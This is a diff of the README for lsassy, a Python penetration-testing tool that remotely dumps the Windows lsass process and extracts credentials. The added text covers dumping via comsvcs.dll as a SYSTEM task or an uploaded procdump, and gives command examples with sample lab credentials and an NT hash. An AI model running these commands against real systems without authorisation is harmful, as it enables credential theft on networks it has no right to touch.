@@ -1,16 +1,17 @@
 # lsassy
 
-[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=0.2.5&x2=0)](https://pypi.org/project/lsassy/) [![Twitter](https://img.shields.io/twitter/follow/hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/follow?screen_name=hackanddo)
+[![PyPI version](https://d25lcipzij17d.cloudfront.net/badge.svg?id=py&type=6&v=1.0.0&x2=0)](https://pypi.org/project/lsassy/) [![Twitter](https://img.shields.io/twitter/follow/hackanddo?label=HackAndDo&style=social)](https://twitter.com/intent/follow?screen_name=hackanddo)
 
-![CME Module example](/assets/cme_lsassy.gif)
+![CME Module example](/assets/example.png)
 
-Python library to remotely parse lsass dump and extract credentials.
+Python library to remotely extract credentials.
 This library uses [impacket](https://github.com/SecureAuthCorp/impacket) projects to remotely read necessary bytes in lsass dump and [pypykatz](https://github.com/skelsec/pypykatz) to extract credentials.
 
 | Chapters                                     | Description                                             |
 |----------------------------------------------|---------------------------------------------------------|
 | [Requirements](#requirements)                | Requirements to install lsassy from source              |
 | [Basic Usage](#basic-usage)                  | Command line template for standalone version            |
+| [Advanced Usage](#advanced)                  | Advanced usage (Dumping methods, execution methods, ...)|
 | [CrackMapExec Module](#crackmapexec-module)  | Link to CrackMapExec module included in this repository |
 | [Examples](#examples)                        | Command line examples for standalone and CME module     |
 | [Installation](#installation)                | Installation commands from pip or from source           |
@@ -26,7 +27,38 @@ This library uses [impacket](https://github.com/SecureAuthCorp/impacket) project
 ## Basic Usage
 
 ```
-lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target>:/share_name/path/to/lsass.dmp
+lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target>
+```
+
+## Advanced
+
+This tool can dump lsass in different ways.
+
+### comsvcs.dll method (Default)
+
+This method **only uses built-in Windows files** to extract remote credentials. It uses **minidump**
+function from **comsvcs.dll** to dump **lsass** process. As this can only be done as **SYSTEM**, it creates a remote
+task as **SYSTEM**, runs it and then deletes it.
+
+```
+lsassy [--hashes [LM:]NT] [<domain>/]<user>[:<password>]@<target>
+```
+
+### Procdump method
+
+This method uploads **procdump.exe** from SysInternals to dump **lsass** process. It will first try to execute
+procdump using WMI, and if it fails it will create a remote task, execute it and delete it.
+
+```
+lsassy [--hashes [LM:]NT] -p /path/to/procdump.exe [<domain>/]<user>[:<password>]@<target>
+```
+
+### Remote parsing only
+
+lsassy can parse an already dumped lsass process.
+
+```
+lsassy [--hashes [LM:]NT] --dumppath /share/path/to/dump.dmp [<domain>/]<user>[:<password>]@<target>
 ```
 
 ## CrackMapExec module
@@ -39,10 +71,18 @@ CrackMapExec module is in `cme` folder : [CME Module](/cme/)
 
 ### lsassy
 
-```
-lsassy ADSEC.LOCAL/jsnow:Winter_is_coming_\!@dc01.adsec.local:/C$/Windows/Temp/lsass.dmp
+```bash
+# RunDLL Method
+lsassy adsec.local/jsnow:Winter_is_coming@dc01.adsec.local
 
-lsassy --hashes 952c28bd2fd728898411b301475009b7 Administrateur@desktop01.adsec.local:/ADMIN$/lsass.dmp
+# Procdump Method
+lsassy -p /tmp/procdump.exe adsec.local/jsnow:Winter_is_coming@dc01.adsec.local
+
+# Remote parsing only
+lsassy --dumppath C$/Windows/Temp/lsass.dmp adsec.local/jsnow:Winter_is_coming@dc01.adsec.local
+
+# NT Hash Authentication
+lsassy --hashes 952c28bd2fd728898411b301475009b7 Administrator@desktop01.adsec.local
 ```
 
 ### CME Module
@@ -68,6 +108,15 @@ python3.7 setup.py install
 ### ChangeLog
 
 ```
+v1.0.0
+------
+* Built-in lsass dump
+** Lsass dump using built-in Windows
+** Lsass dump using procdump (using -p parameter)
+* Add --dumppath to ask for remote parsing only
+* Code refactoring
+* Add --quiet to quiet output
+
 v0.2.0
 ------
 * Add BloodHound option to CME module (-o BLOODHOUND=True)
